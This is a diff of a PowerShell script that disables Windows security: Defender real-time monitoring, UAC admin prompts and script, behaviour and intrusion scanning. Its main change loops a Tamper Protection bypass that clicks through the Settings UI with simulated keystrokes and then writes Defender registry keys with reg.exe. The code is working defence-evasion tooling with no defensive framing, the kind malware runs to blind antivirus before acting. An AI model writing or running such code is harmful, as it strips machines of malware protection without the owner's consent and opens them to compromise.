@@ -4,31 +4,40 @@ Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
 #disable uac
     Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
     #disable tamper protection
-$TamperProtectionEnabled = (Get-MpPreference).TamperProtection
-if ($TamperProtectionEnabled -eq 1 -or [string]::IsNullOrEmpty($TamperProtectionEnabled)) {
+while ($true) {
+    # Check if Tamper Protection is enabled
+    if ((Get-MpComputerStatus).IsTamperProtected) {
+        # if Tamper Protection is enabled, perform actions
+
         $shell = New-Object -ComObject WScript.Shell
-$shell.SendKeys("^{ESC}")
-Start-Sleep -Seconds 2
-$shell.SendKeys("Tamper Protection")
-Start-Sleep -Seconds 2
-$shell.SendKeys("{ENTER}")
-Start-Sleep -Seconds 4
-1..4 | ForEach-Object {
-    $shell.SendKeys("{TAB}")
-    Start-Sleep -Milliseconds 200
-}
-$shell.SendKeys(" ")
-Start-Sleep -Seconds 1
-$shell.SendKeys("{RIGHT}")
-$shell.SendKeys("%y")
-$shell.SendKeys("{ENTER}")
-$shell.SendKeys("%{F4}")
+        $shell.SendKeys("^{ESC}")
+        Start-Sleep -Seconds 1
+        $shell.SendKeys("Tamper Protection")
+        Start-Sleep -Seconds 2
+        $shell.SendKeys("{ENTER}")
+        Start-Sleep -Seconds 4
+        1..4 | ForEach-Object {
+            $shell.SendKeys("{TAB}")
+            Start-Sleep -Milliseconds 200
+        }
+        $shell.SendKeys(" ")
+        Start-Sleep -Seconds 1
+        $shell.SendKeys("{RIGHT}")
+        $shell.SendKeys("%y")
+        $shell.SendKeys("{ENTER}")
+        $shell.SendKeys("%{F4}")
+        Start-Process -FilePath "reg.exe" -ArgumentList "add 'HKLM\SOFTWARE\Microsoft\Windows Defender\Features' /v TamperProtection /t REG_DWORD /d 4 /f" -Verb RunAs -Wait
+        Start-Process -FilePath "reg.exe" -ArgumentList "add 'HKLM\SOFTWARE\Microsoft\Windows Defender\Features' /v TamperProtectionSource /t REG_DWORD /d 2 /f" -Verb RunAs -Wait
+        Start-Process -FilePath "reg.exe" -ArgumentList "add 'HKLM\SOFTWARE\Microsoft\Windows Defender\Features' /v SenseDevMode /t REG_DWORD /d 0 /f" -Verb RunAs -Wait
+
+        Write-Host "Tamper Protection is enabled."
+    } else {
+        # if Tamper Protection is disabled, break the loop
+        Write-Host "Tamper Protection is not enabled."
+        break
+    }
 }
 
-# Disable Tamper Protection
-Start-Process -FilePath "reg.exe" -ArgumentList "add 'HKLM\SOFTWARE\Microsoft\Windows Defender\Features' /v TamperProtection /t REG_DWORD /d 4 /f" -Verb RunAs -Wait
-Start-Process -FilePath "reg.exe" -ArgumentList "add 'HKLM\SOFTWARE\Microsoft\Windows Defender\Features' /v TamperProtectionSource /t REG_DWORD /d 2 /f" -Verb RunAs -Wait
-Start-Process -FilePath "reg.exe" -ArgumentList "add 'HKLM\SOFTWARE\Microsoft\Windows Defender\Features' /v SenseDevMode /t REG_DWORD /d 0 /f" -Verb RunAs -Wait
 
     #method 1
     Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true
